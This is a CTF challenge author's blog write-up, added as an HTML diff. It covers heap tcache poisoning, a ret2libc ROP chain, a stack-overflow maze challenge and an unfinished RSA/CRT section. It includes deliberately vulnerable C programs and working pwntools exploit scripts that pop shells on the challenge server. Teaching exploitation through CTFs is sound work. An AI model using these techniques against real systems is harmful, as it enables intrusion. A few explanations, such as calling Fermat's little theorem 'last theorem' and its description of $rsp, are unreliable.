@@ -1,0 +1,514 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>wrenches.online</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/styles/base16/gruvbox-dark-soft.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  </head>
+  <body class="bg-stone-900 text-stone-300">
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <main class="relative mx-auto w-4/5 mt-10 text-xl mb-[75px]">
+        <div class="my-3 text-3xl font-bold text-orange-200 header">wrenches.online</div>
+        <hr class="my-10">
+        <div class="header my-3 text-2xl font-bold">nyp</div>
+        <div class="my-3 text-1xl">
+            i authored 10 challenges for nypctf hosted in june25. i think overall my challenges were a lot harder than they had any right to be for a beginner ctf (despite me purposefully nerfing them - i have been informed i have zero frame of reference for what beginners are actually capable of), so i am just grateful some of my work got solved.
+        </div>
+
+        <div class="my-3">the song for today is <a href="https://www.youtube.com/watch?v=z2vCOR51v34">tosenbo by wowaka.</a></div>
+
+        <div class="header mt-10 mb-5 text-xl font-bold font-mono">liar-dancer</div>
+
+        <div class="my-3">i must preface this w the information that i simply am not a pwner and had to learn heap basics two days before the ctf as no one had written any pwn. thank you to my senseis <span class=font-mono>fern</span> and <span class=font-mono>ndg</span> for very graciously teaching me about, in their own words, 'the easiest heap concept', tcache poisoning.</div>
+        
+        <pre><code class="language-c">
+// gcc chal.c -no-pie -o chal
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+#define MAX_DANCES 16
+#define DANCE_SIZE 256
+
+char *dances[MAX_DANCES];
+
+void win() {
+    printf("PEARTO IS PLEASED\n");
+    system("cat flag.txt");
+    exit(0);
+}
+
+void create_dance() {
+    int index;
+    printf("WHERE IS TETO DANCING? (0 to %d) > ", MAX_DANCES - 1);
+    scanf("%d", &index);
+    getchar(); // Consume the newline character
+
+    if (index < 0 || index >= MAX_DANCES) {
+        printf("WE CAN'T DANCE HERE.\n");
+        return;
+    }
+
+    dances[index] = (char *)malloc(DANCE_SIZE * sizeof(char));
+
+    printf("DESCRIBE TETO'S DANCE (max %d characters) > ", DANCE_SIZE - 1);
+    fgets(dances[index], DANCE_SIZE, stdin);
+    dances[index][strcspn(dances[index], "\n")] = 0;
+
+    printf("TETO IS NOW DANCING AT POSITION %d AT %p.\n", index, dances[index]);
+}
+
+void delete_dance() {
+    int index;
+    printf("WHICH DANCE MUST GO? (0 to %d) > ", MAX_DANCES - 1);
+    scanf("%d", &index);
+
+    if (index < 0 || index >= MAX_DANCES || dances[index] == NULL) {
+        printf("THERE IS NO DANCE HERE.\n");
+        return;
+    }
+
+    free(dances[index]);
+    printf("NOW THE DANCE AT %d IS GONE.\n", index);
+}
+
+void edit_dance() {
+    int index;
+    printf("ENTER THE DANCE YOU WOULD LIKE MODIFIED > ", MAX_DANCES - 1);
+    scanf("%d", &index);
+    getchar(); // Consume the newline character
+
+    if (index < 0 || index >= MAX_DANCES || dances[index] == NULL) {
+        printf("THERE IS NO DANCE HERE.\n");
+        return;
+    }
+
+    printf("DESCRIBE YOUR NEW DANCE. (max %d characters) > ", DANCE_SIZE - 1);
+    fgets(dances[index], DANCE_SIZE, stdin);
+    dances[index][strcspn(dances[index], "\n")] = 0; // Remove newline character
+
+    printf("TETO IS NOW DANCING A NEW DANCE AT %d.\n", index);
+}
+
+int main() {
+    int choice;
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+    while (1) {
+        printf("-------\nLIAR DANCER\n-------\n");
+        printf("1. CREATE DANCE\n");
+        printf("2. DELETE DANCE\n");
+        printf("3. EDIT DANCE\n");
+        printf("4. QUIT\n\n");
+        printf("TETOTETOTETO > ");
+        scanf("%d", &choice);
+
+        switch (choice) {
+            case 1:
+                create_dance();
+                break;
+            case 2:
+                delete_dance();
+                break;
+            case 3:
+                edit_dance();
+                break;
+            case 4:
+                return 0;
+            default:
+                printf("LIAR!!!\n");
+                exit(0);
+        }
+    }
+
+    return 0;
+  }
+        </code></pre>
+
+        <div class="my-3 text-1xl">
+          by the very nature of pwn a beginner-friendly writeup is kind of impossible because it demands knowledge of memory allocation and the basic structure and interior mechanism of a compiled binary. i cannot offer to teach such foundational information, this is kind of just something you have to learn on your own time. but in very loose terms, we can mark out spaces of memory for the program to use with <span class="font-mono">malloc()</span>, we can stop using those spaces whenever we want with <span class="font-mono">free()</span>, and the underlying structure and behavior of chunks of memory that are provided by these functions is so thorny and prone to error that an entire industry has emerged from exploiting them. here we will dip our toes in that scary world, if only for a moment.
+        </div>
+
+        <div class="my-3 text-1xl">
+            so here is our heap challenge. we are able to <span class="font-mono">malloc()</span> and <span class="font-mono">free()</span> chunks of <span class="font-mono">0x256</span> bytes. note the complete lack of checks as to whether or not our pointers in <span class="font-mono">dances</span> have already been freed / malloc'd, meaning if we create a chunk at index 0 then free that chunk, we can still access it with <span class="font-mono">edit_dance()</span>.
+        </div>
+
+        <div class="my-3 text-1xl">
+            this is very common use-after-free nonsense. the important thing we want to do here is get <span class="font-mono">malloc()</span> to allocate some memory wherever we want. this is important because we can write and edit our <span class=font-mono>malloc()</span>'d chunks, and being able to write to wherever location in memory is very powerful. we will discuss the things that can be done with that arbitrary write later. but take my word for it that it will get us our flag eventually.
+        </div>
+
+        <div class="my-3 text-1xl">
+            to grossly oversimplify, the chunks allocated by <span class="font-mono">malloc()</span> have a certain piece of metadata in them known as the <span class="font-mono">fd</span> pointer. this fd pointer dictates where the next malloc will occur, and it is located in the chunk itself. recall that we can write to chunks, and therefore, we can actually overwrite this fd pointer with our uaf.</span>
+        </div>
+
+        <div class="my-3">
+          we can therefore corrupt this pointer to whatever address in memory we want by simply writing to the freed chunk, then <span class="font-mono">malloc()</span> twice - once to malloc a chunk that has our corrupted pointer, and twice to actually get that chunk at our address. we do this by <span class="font-mono">malloc()</span>ing twice, <span class=font-mono>free()</span>ing twice, and then editing our freed chunk with the fd pointer that we want. 
+        </div>
+
+        <img src="images/nyp-heap.png">
+
+        <div class="my-3">
+          above is a visualisation of the heap after we malloc and free twice. note that the fd pointer is now pointing to the chunk at <span class=font-mono>0x4052a0</span>. now, we can write to that chunk, and edit the fd pointer. i'll corrupt the fd pointer such that it becomes all 'A's.
+        </div>
+
+        <img src="images/nyp-heap2.png">
+
+        <div class="my-3">the fd pointer is now 0x41414141, meaning we have corrupted it successfully.</div>
+
+        <div class="my-3">ok but what pointer do we want? notice that we have a <span class=font-mono>win()</span> func, and we would like this function to be executed. we can simply overwrite the area of memory that stores function pointers called the GOT - we pick a function that we want to ovewrwrite, let's say <span class=font-mono>getchar()</span>. we find where the pointer to this function is located in memory, and we overwrite it with our <span class=font-mono>win() function</span>.</div>
+
+        <div class="my-3">then, we malloc twice more. once to get our chunk to actually use this corrupted fd pointer, and the second for malloc to get tricked into using our fd pointer. after that, we're all set! the full solve script is attached for reference below. note that i skipped over some details, such as pointer mangling and picking a good function to overwrite in GOT, but a. i don't feel like it and b. it's beyond the scope of this writeup.</div>
+
+        <pre><code class="language-python">
+  from pwn import *
+#context.log_level = "DEBUG"
+context.binary = elf = ELF("./chal")
+p = remote("chall.nypinfosec.net", 8004)
+
+def sl(inp):
+    p.sendline(inp.encode())
+    z = p.recvuntil(b">").decode()
+    print(z)
+    return z
+
+print(p.recvuntil(b">").decode())
+sl('1')
+sl('0')
+key = (int(sl('liardancer').split('.')[0].split(' ')[-1], 16) >> 12) # just parsing the output to get our heap base. the fd pointers are mangled by xoring w this key, which is y we need to recover it
+print(f'key: {hex(key)}')
+sl('1')
+sl('1')
+
+# we malloc two chunks to populate the tcache bin
+
+sl('liardancer')
+sl('2')
+sl('0')
+sl('2')
+sl('1')
+# we free twice
+got_addr = p64(elf.got["getchar"] ^ key)
+print(f'{got_addr=}')
+print(f'{elf.got['getchar']=}')
+with open('payload.bin', 'wb') as p:
+    p.write(got_addr)
+p.close()
+sl('3')
+sl('1')
+# this writes our got address to fd in our freed chunk
+# when we malloc once again, it will fit into this chunk
+# when we malloc a second time, it will refer to our poisoned fd pointer (which we point to got)
+# so now we can arbitrarily write to the got
+p.sendline(got_addr)
+print(p.recvuntil(b'>').decode())
+sl('1')
+sl('0')
+sl('liar')
+sl('1')
+sl('1')
+# we overwrite a func in got (getchar) with our win func. next time getchar is executed win() will exec instead
+win_addr = p64(elf.sym["win"])
+p.sendline(win_addr)
+
+p.interactive()
+
+
+#fuck my life this is somehow supposed to be beginner pwn and it took me no joke 3 hours
+#i dont get pwn
+        </code></pre>
+
+        <div class="header mt-10 mb-5 text-xl font-bold font-mono">spacewalk</div>
+
+        <div class="my-3">whew, no more heap. normal stack stuff now.</div>
+
+        <pre><code>
+// gcc -o chal chal.c -fno-stack-protector -Wl,-z,relro,-z,now -pie
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int main() {
+    setbuf(stdin, NULL);
+    setbuf(stdout, NULL);
+    char buf[32];
+    printf("we're spacewalking over at %p\n", printf);
+    puts("where are we headed next? >");
+    scanf("%s", buf);
+    return 0;
+}</code></pre>
+
+      <div class="my-3">this binary has full protections excluding a canary, and we are given a leak of the <span class=font-mono">printf()</span> function alongside a very obvious buffer overflow. now is the time to teach the complete basics of ROP, return-oriented programming. for now let's just see what happens when we do the classic skiddie trick of spamming 'A's:</div>
+
+      <img src="images/nyp-stack.png">
+
+      <div class="my-3">we see that we have managed to overwrite our registers <span class=font-mono>$rsp</span> and <span class=font-mono>$rbp</span>. the first one, <span class=font-mono>$rsp</span>, is the address that the function that will return to after execution is done. we have overwritten it into a garbage address that the binary cannot handle, and it crashes.</div>
+
+      <div class="my-3">now we require more precision - at what offset is <span class=font-mono>$rsp</span> actually located? meaning, how many bytes do we need to write exactly so that we overwrite <span class=font-mono>$rsp</span>? let's pop it open in gdb:</div>
+
+      <img class=my-3 src="images/gdb.png">
+
+      <img class=my-3 src="images/gdb2.png">
+
+      <img class=my-3 src="images/gdb3.png">
+
+      <div class="my-3">going over the math in our head, this checks out - 32 bytes of buffer, <span class=font-mono>$rbp</span> occupies 8 bytes, and then our <span class=font-mono>$rsp</span>. 40 bytes total.</div>
+
+      <div class="my-3">the goal of ROP (or more specifically, ret2libc in this case) is to overwrite this return address into a piece of code that is in memory somewhere that will give us a shell. the way we do this is by finding gadgets that we can execute, small pieces of code that will combine together. the central component of such shellcode is as follows: the address to <span class=font-mono>system()</span>, and a way to pass <span class=font-mono>/bin/sh</span> as our parameters into the call to <span class=font-mono>system()</span>.</div>
+
+      <img src="images/rop.png">
+
+      <div class="my-3">so the plan is simple: find these gadgets in the executable's memory, and then craft a payload that will execute our ROP chain one by one. we will be able to find these gadgets in the provided <span class=font-mono>libc.so.6</span>, which is the file for the C standard library that most executables are compiled with. the gadgets that we need specifically are a <span class=font-mono>pop rdi ; ret ;</span> gadget, as <span class=font-mono>rdi</span> is the register where the argument to <span class=font-mono>system()</span> is stored, a pointer to the string <span class=font-mono>/bin/sh</span> in memory, and a final single <span class=font-mono>ret</span> to return our <span class=font-mono>system()</span> call.</div>
+
+      <img src="images/vmmap.png">
+
+      <div class="my-3">but wait! there's PIE (position independent executable). this means that the offsets to libc are always randomised per each run of the program, and are not static in the binary. we can't just pull addresses from the provided libc and automatically expect them to work - we need to know where libc is located in the binary at each run. this is called a 'libc' leak, and other harder pwn challenges will require you to leak an address to a function pointer with a clever exploit but here we are given one directly by way of printing the <span class=font-mono>printf</span> pointer.</div>
+
+      <div class="my-3">a few steps are required here. we need to run the program locally, find our libc base, and then find where <span class=font-mono>printf</span> is located in libc. despite PIE, the offset between <span class=font-mono>printf</span> and the first address in libc is always constant (the offsets are the same for any function, for that matter, which is why ROP works). the libc address is the topleft most address with 'libc' in the nam in <span class=font-mono>vmmap</span>.</div>
+
+      <pre><code>
+>>> hex(0x7ffff7e26440-0x00007ffff7dcc000)
+'0x5a440'
+      </code></pre>
+
+      <div class="my-3">with this offset, we can now calculate the libc base, and following that, we can now find all of our rop gadgets in memory. the other pointers can be found with pwntools, as demonstrated in the solvescript below.</div>
+
+      <img src="images/ret.png">
+
+      <pre><code>
+from pwn import *
+
+printf_offset = 0x5a440
+ret_offset = 0x0006E974
+pop_rdi_offset = 0x001064DD
+
+libc = ELF('./libc.so.6')
+elf = ELF('./chal')
+p = remote('chall.nypinfosec.net', 8006)
+
+printf_leak = int(p.recvline().split(b' ')[-1][:-1].decode(), 16)
+print(f'leaked printf at {hex(printf_leak)}')
+
+libc.address = printf_leak - libc.sym["printf"]
+
+payload = b'A' * 40
+payload += p64(libc.address + ret_offset)
+payload += p64(libc.address + pop_rdi_offset)
+payload += p64(next(libc.search("/bin/sh")))
+payload += p64(libc.sym["system"])
+payload += p64(libc.sym["exit"])
+
+print(payload)
+print(p.recvline())
+p.sendline(payload)
+p.interactive()
+      </code></pre>
+
+      <div class="header mt-10 mb-5 text-xl font-bold font-mono">mikumaze</div>
+
+       <div class="my-3">this is probably the easiest pwn of the set. for now we can honestly ignore all the scary ncurses nonsense and focus on the buffer overflow present in <span class=font-mono>name</span>. 32 bits of buffer, 64 bits of <span class=font-mono>mikuprotect</span>, and then our maze.</div>
+
+      <pre><code>
+// gcc chal.c -o chal -lncurses -g
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;ncurses.h&gt;
+
+#define WIDTH 12
+#define HEIGHT 8
+
+int main() {
+
+    char mikumaze[256];
+    char mikuprotect[64];
+    char name[32];
+
+    strcpy(mikumaze,
+        "############t"
+        "#.#.#..#...#t"
+        "#.#.####.#.#t"
+        "#.#......#.#t"
+        "#.########.#t"
+        "#.#......#.#t"
+        "#...####.#.#t"
+        "############t");
+    strcpy(mikuprotect, "初音ミク初音ミク初音ミク初音ミク");
+    printf("miku wants to know your name > ");
+    scanf("%s", name);
+
+    printf("%s\n", mikuprotect);
+    if (strcmp(mikuprotect, "初音ミク初音ミク初音ミク初音ミク")) {
+        printf("miku detected you smashing the stack!");
+        exit(0);
+    }
+
+    char maze[HEIGHT][WIDTH + 1];
+    // main ncurses
+
+    int row = 0; 
+    int col = 0;
+    for (int i = 0; i < strlen(mikumaze); i++) {
+        if (mikumaze[i] != 't' && mikumaze[i] != '#' && mikumaze[i] != '.') {
+            printf("hmm something's wrong with miku's maze...");
+            return 0;
+        }
+        if (mikumaze[i] == 't') {
+            maze[row][col] = '\0';
+            row++;
+            col = 0;
+        } else {
+            maze[row][col++] = mikumaze[i];
+        }
+    }
+
+    initscr();
+    noecho();
+    cbreak();
+    keypad(stdscr, TRUE);
+    curs_set(0);
+
+    int mikux = 1, mikuy = HEIGHT-2;
+
+    while (1) {
+        clear();
+        for (int y = 0; y < HEIGHT; y++) {
+            for (int x = 0; x < WIDTH; x++) {
+                if (x == mikux && y == mikuy)
+                    mvaddch(y, x, '@');
+                else
+                    mvaddch(y, x, maze[y][x]);
+            }
+        }
+
+        if (mikux == WIDTH-1 && mikuy == 1) {
+            FILE *fptr;
+            fptr = fopen("flag.txt", "r");
+            char flag[100];
+            fgets(flag, 100, fptr);
+            mvprintw(HEIGHT, 0, "You solved the mikumaze!");
+            mvprintw(HEIGHT+1, 0, flag);
+            refresh();
+            getch();
+            break;
+        }
+
+        refresh();
+        int ch = getch();
+        int new_mikux = mikux;
+        int new_mikuy = mikuy;
+
+        if (ch == KEY_UP) new_mikuy--;
+        else if (ch == KEY_DOWN) new_mikuy++;
+        else if (ch == KEY_LEFT) new_mikux--;
+        else if (ch == KEY_RIGHT) new_mikux++;
+        else if (ch == 'q') break;
+
+        if (new_mikux >= 0 && new_mikux < WIDTH && new_mikuy >= 0 && new_mikuy < HEIGHT) {
+            if (maze[new_mikuy][new_mikux] == '.')
+                mikux = new_mikux, mikuy = new_mikuy;
+        }
+    }
+
+
+    printf("end");
+    return 0;
+}
+      </code></pre>
+
+      <div class="my-3">we get the flag by going to the top right corner of the maze, but it is currently unsolvable as is. the intended exploit here is to take advantage of the buffer overflow getting <span class=font-mono>scanf()</span>'d into <span class=font-mono>name</span>, and overwrite the maze in memory such that it becomes solvable.</div>
+
+      <div class="my-3">however we cannot just anyhow overwrite by spamming 'A's due to the presence of <span class=font-mono>mikuprotect</span> - my intent with this challenge was to introduce a basic protection known as the stack canary, which is a randomised value placed on the stack that the program checks every now and then. if the program detects that the canary has been corrupted, it exits out of the program to prevent any other damage from occurring. </div>
+
+      <img src="images/canary.png">
+
+      <div class="my-3">miku gets very angry at us if we corrupt the values on the stack, but actually, since we know what the canary is (it's always the same per program execution), we can just modify our buffer overflow to overwrite the canary with itself.for my sake when debugging the binary i'm going to patch out all the <span class=font-mono>ncurses</span> bullshit, which is impossible to deal with in gdb (and was also very difficult to get up on the infra side due to the infinite issues with pseudoterminal nonsense i don't fully understand).</div>
+
+      <div class="my-3">anyways the payload ends up being quite simple. note that we need to add a null terminator after our canary due to <span class=font-mono>strcmp</span> - recall that all strings are null terminated in C, and strcmp stops reading from the buffer once it encounters our <span class=font-mono>\x00</span> byte.</div>
+
+      <pre><code>
+buffer = b'A' * 32
+miku_bytes = "初音ミク初音ミク初音ミク初音ミク".encode("utf-8")
+padding = b'\x00' * (64 - len(miku_bytes))
+maze = b'.' * 256
+payload = buffer + miku_bytes + padding + maze
+
+with open('payload.bin', 'wb') as file:
+    file.write(payload)
+      </code></pre>
+
+      <div class="my-3">this manual payload saving + copying is kind of baroque but it is easier than having to deal with pwntools + ncurses nonsense. also thank you weifeng for the script because i have lost mine. once we paste this in (using a clipboard tool that can support nullterms nicely)...</div>
+
+      <img class=my-3 src="images/maze.png">
+
+      <img class=my-3 src="images/solve.png">
+
+      <div class="header mt-10 mb-5 text-xl font-bold font-mono">cathode-ray-tube & constant-reactor-termination</div>
+
+      <div class="my-3">at this point in the writeup i am relieved because i finally get to talk about something i'm confident in my knowledge about, cryptography, and i don't need to waffle about libc offsets. i wrote two unsolved cryptography challenges both centered around the Chinese remainder theorem (CRT), hence the names. the following assumes basic knowledge of modular arithmetic.</div>
+
+      <div class="my-3">CRT is the idea that given the following equations, knowledge of all given <span class="font-mono">k_i, m_i,</span> but with a secret <span class=font-mono>N</span>:</div>
+
+      <pre><code>
+N === k_1 mod m_1
+N === k_2 mod m_2 
+...
+N === k_i mod m_i
+      </code></pre>
+
+      <div class="my-3">we can recover <span class=font-mono>N mod (m_1 * m_2 * m_3 * ... * m_i)</span>. the details of the algorithm used to derive it are irrelevant for now, we can just treat CRT as a black box that returns the value of <span class=font-mono>N</span> that we need. note that the ultimate goal most of the time is to recover <span class=font-mono>N</span> in its entirety, and this is typically only accomplishable if we have enough <span class=font-mono>m_i</span> such that <span class=font-mono>(m_1 * m_2 * m_3 * ... *  m_i)</span> is greater than <span class=font-mono>N</span>.</div>
+
+      <pre><code>
+from secret import flag
+from Crypto.Util.number import getPrime, bytes_to_long
+
+N = 1 
+
+pt = bytes_to_long(flag)
+assert pt.bit_length() == 647
+
+for i in range(20):
+  N *= getPrime(32)
+
+for i in range(5):
+  N *= getPrime(512)
+
+ct = pow(pt, 0x10001, N)
+
+print(f'{ct = }')
+print(f'{N = }')
+
+      </code></pre>
+
+      <div class="my-3">the above is the code for <span class=font-mono>cathode</span>. this is a very nonstandard RSA formulation with N composed of 20 small 32-bit primes, and 5 512-bit ones. the typical threshold of factorisability on normal computers within 10 minutes is somewhere around 32-64 bits, so we can actually fully retrieve all 20 32-bit primes used. the 512-bit primes are not able to be retrieved.</div>
+
+      <div class="my-3">now let's talk about RSA as it is implemented usually, with two large primes that are mostly equal in size. i find it best to think of modular exponentiation over a non-prime N as the 'combination' of exponentiation over its two factors: simply put, if you want to calculate <span class=font-mono>a ** e mod N</span>, and <span class=font-mono>N = p * q</span>, you are essentially calculating <span class=font-mono>a ** e mod p</span> and <span class=font-mono>a ** e mod q</span> and then "combining" the two results from these calculations. i am stopping myself from using the word <span class=font-mono>subgroup</span> or <span class=font-mono>group</span> because a. i have no actual background in group theory, i'm just a dumb fucker who's done this too much, and b. it would scare beginners off.</div>
+
+      <div class="my-3">but for the ball-knowers out there essentially multiplication over some prime p is a cyclic group with order p-1, meaning that <span class="font-mono"> a * a * a ... * a</span> (<span class=font-mono>p-1</span> times) is always going to result in some number <span class=font-mono>pn + 1</span>, or in other words, <span class=font-mono>a**(p-1) mod p === 1</span>. those of you who watched numberphile videos in your youth might recognise this as fermat's last theorem. this is a concept that is completely not taught in (normal) schools over here so allow yourself a bit of grace if none of this makes any fucking sense.</div>
+
+      <div class="my-3">so how does RSA decryption actually work? let's consider the following:</div>
+
+      <div class="my-3">todo...</div>
+
+
+
+
+
+    </main>
+
+    <div class="sticker">
+      <img src="images/images.gif">
+    </div>
+
+  </body>
+  <script>hljs.highlightAll();</script>
+
+  <style>
+    div {
+      text-align: justify;
+    }
+  </style>
+</html>
